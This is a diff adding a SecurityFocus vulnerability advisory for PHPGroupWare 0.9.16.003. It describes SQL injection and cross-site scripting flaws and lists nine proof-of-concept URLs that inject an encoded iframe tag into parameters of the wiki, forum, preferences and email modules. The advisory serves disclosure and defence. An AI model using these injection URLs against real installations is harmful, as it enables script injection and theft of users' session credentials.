@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/11952/info
+
+Reportedly PHPGroupWare contains multiple input validation vulnerabilities; it is prone to multiple SQL injection and cross-site scripting issues. These issues are all due to a failure of the application to properly sanitize user-supplied input. 
+
+The SQL injection issues may allow a remote attacker to manipulate query logic, potentially leading to unauthorized access to sensitive information such as the administrator password hash or corruption of database data. SQL injection attacks may also potentially be used to exploit latent vulnerabilities in the underlying database implementation. 
+
+The cross-site scripting issues could permit a remote attacker to create a malicious link to the vulnerable application that includes hostile HTML and script code. If this link were followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks. 
+
+These issues were identified in PHPGroupWare 0.9.16.003, however, it is possible that other versions are affected as well.
+
+http://www.example.com/phpgroupware/wiki/index.php?kp3=99884d8a63791f406585913d74476b11
+%22%3E%3Ciframe%3E
+http://www.example.com/phpgroupware/index.php?menuaction=forum.uiforum.post&type=new%22
+%3E%3Ciframe%3E
+http://www.example.com/phpgroupware/index.php?menuaction=forum.uiforum.read&msg=202%22%
+3E%3Ciframe%3E
+http://www.example.com/phpgroupware/index.php?menuaction=forum.uiforum.read&forum_id=3%
+22%3E%3Ciframe%3E&msg=202
+http://www.example.com/phpgroupware/index.php?menuaction=forum.uiforum.read&msg=42&pos=
+10%22%3E%3Ciframe%3E
+http://www.example.com/phpgroupware/index.php?menuaction=preferences.uicategories.index
+&cats_app=%22%3E%3Ciframe%3E
+http://www.example.com/phpgroupware/index.php?menuaction=preferences.uicategories.edit&
+cats_app=notes&extra=&global_cats=True&cats_level=True&cat_parent=188&cat_id
+=188%22%3E%3Ciframe%3E
+http://www.example.com/phpgroupware/index.php?menuaction=email.uimessage.message&msgbal
+l[msgnum]=1%22%3E%3Ciframe%3E&msgball[folder]=INBOX.hello&msgball[acctnum]=0
+&sort=1&order=1&start=0
+http://www.example.com/phpgroupware/index.php?menuaction=email.uicompose.compose&fldbal
+l[folder]=INBOX.hello&fldball[acctnum]=0&to=%22%3E%3Ciframe%3E&personal=&sor
+t=1&order=1&start=0
